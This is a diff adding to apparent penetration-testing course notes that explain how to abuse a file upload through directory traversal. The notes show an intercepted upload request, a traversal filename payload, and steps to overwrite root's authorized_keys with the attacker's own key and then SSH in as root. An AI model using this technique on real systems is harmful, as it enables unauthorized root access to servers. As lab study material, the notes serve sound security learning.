@@ -336,5 +336,59 @@ If the target webapp was using ASP instead of PHP, we can follow the same exact 
 
 File Uploads can still have severe consequences even if we cannot get our file to execute. In this sort of situation, we should leverage another vuln like Directory Traversal to abuse the File Upload.
 
+Consider that this is our File Upload request seen in Burp:
 
+```
+POST /upload HTTP/1.1
+Host: mountaindesserts.com:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+.
+.
+.
+Content-Disposition: form-data; name="myFile"; filename="testing.txt"
+Content-Type: text/plain
 
+accept me
+```
+
+In Repeater, change the filename= paramerter to a Directory Traversal and Send:
+
+```
+Content-Disposition: form-data; name="myFile"; filename="../../../../../../../../../testing.txt"
+Content-Type: text/plain
+```
+
+Ideally, we see "Successfully Uploaded File: ../../../../../../../../testing.txt". However, we don't know if the web app used the relative path to place the file or if the web app gave us a generic message while sanitizing in the backend.
+
+Let's assume the relative path was used and that we can try to blindly overwrite files. 
+
+First, it's important to know the following:
+- Webapps using Apache, Mginx, or other dedicated web servers often run with users like www-data on Linux. 
+- On Windows, ISS web servers run  as a Network Service Account, which is passwordless with low privileges.
+- After ISS v7.5, Microsoft added ISS Application Pool Identities., which are virtual accounts that run webapps grouped by app pools. Each pool has its own pool identity, which makes it possible tp set specific permissions for accounts running webapps.
+- Admins and devs using programming languages that include their own web server often deploy the webapp without privilege structures, running as Administrator or root to avoid perm issues. We should always check whether we can leverage root or admin privileges in a File Upload Vulnerability.
+
+Let's attempt overwriting the authorized_keys file in the home dir for root! We can try to get our public key in it to SSH into the system as root. First, create your own SSH keypair.
+
+```console
+$ ssh-keygen
+Enter file to save key (/home/kali/.ssh/id_rsa):
+Enter passphrase (empty for no):
+Enter same passphrase again:
+
+$ cat fileup.pub > authorized_keys
+```
+
+Turn Burp intercept on and upload authorized_keys to the webapp. Intercept the upload and change the filename= parameter to filename="../../../../../../../../../../roo/.ssh/authorized_keys" and Forward.
+
+Since we have no way to determine users other than root by displaying /etc/passwd, our only option is to try to SSH as root. It is important to note that, often, root does not have SSH perms.
+
+```console
+// avoid errors
+$ rm ~/.ssh/known_hosts
+
+// ssh with priv key of pub key in authorized_keys
+$ ssh -p 2222 -i fileup root@targetwebsite.com
+
+// if you set a password for the key, use it when prompted
+```
